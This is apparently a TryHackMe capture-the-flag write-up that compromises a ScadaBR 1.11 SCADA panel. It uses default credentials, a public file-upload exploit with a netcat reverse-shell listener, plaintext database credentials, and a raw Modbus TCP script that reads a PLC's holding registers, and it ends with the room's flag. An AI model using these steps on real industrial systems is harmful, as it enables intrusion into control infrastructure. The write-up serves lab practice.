---
title: "Brr"
ctf: "TryHackMe"
date: 2026-07-12
category: web
difficulty: easy (it's hard actually)
flag_format: "THM{...}"
author: "s1ght"
---

# Brr

## Summary

A ScadaBR 1.11 SCADA panel is exposed on port 8080. An authenticated arbitrary file upload vulnerability (EDB-49735) gives RCE as `tomcat7`. From inside the container, a Modbus TCP connection to an internal PLC leaks the flag through its holding registers.

## Solution

### Step 1: Exploit ScadaBR — Arbitrary File Upload to RCE

ScadaBR 1.11 is vulnerable to authenticated arbitrary file upload via the graphical view background image feature. The default credentials `admin:admin` are active.

Using the public exploit [EDB-49735](https://www.exploit-db.com/exploits/49735), a JSP reverse shell is uploaded to `/ScadaBR/uploads/<id>.jsp`. Set up a listener first, then run the exploit:

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — exploit
python2 49735.py 10.48.178.226 8080 admin admin <YOUR_IP> 4444
```

This provides a shell as `tomcat7` inside a Docker container (`172.20.0.3`).

### Step 2: Discover the Internal PLC

The ScadaBR database credentials are in plaintext at `/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/env.properties`:

```
db.type=mysql
db.url=jdbc:mysql://localhost/scadabr
db.username=scadabr
db.password=scadabr
```

Querying the database reveals a Modbus IP data source named **"secret"** that connects to an internal PLC:

```bash
mysql -uscadabr -pscadabr scadabr -e 'SELECT id, xid, name, dataSourceType FROM dataSources;'
# id  xid         name    dataSourceType
# 1   DS_644638   secret  3
```

The ScadaBR web UI (`data_sources.shtm`) confirms the connection target: **`plc:5020`**, which resolves to `172.20.0.2`.

```bash
getent hosts plc
# 172.20.0.2  plc
```

### Step 3: Read the Flag from PLC Modbus Registers

The flag is stored in the PLC's **holding registers** (Modbus function code 3). Each register holds one ASCII character in its low byte. A simple Python script reads them via raw Modbus TCP:

```python
import socket, struct

def read_holding_registers(host, port, slave_id, start, count):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    # Modbus TCP: TID(2) + Protocol(2) + Length(2) + UnitID(1) + FC(1) + Start(2) + Count(2)
    request = struct.pack('>HHHBBHH', 1, 0, 6, slave_id, 3, start, count)
    s.send(request)
    response = s.recv(4096)
    s.close()
    byte_count = response[8]
    return response[9:9 + byte_count]

data = read_holding_registers("172.20.0.2", 5020, 1, 0, 50)
flag = "".join(chr(data[i + 1]) for i in range(0, len(data), 2) if data[i + 1] != 0)
print(flag)
```

Output:

```
THM{modbus_hid}
```

## Tools Used

| Tool | Purpose |
|------|---------|
| EDB-49735 (`49735.py`) | ScadaBR 1.11 authenticated file upload → JSP webshell |
| MySQL CLI | Enumerate ScadaBR database for data source config |
| Python 3 (socket, struct) | Raw Modbus TCP register reads from PLC |

## Flag

```
THM{modbus_hid}
```
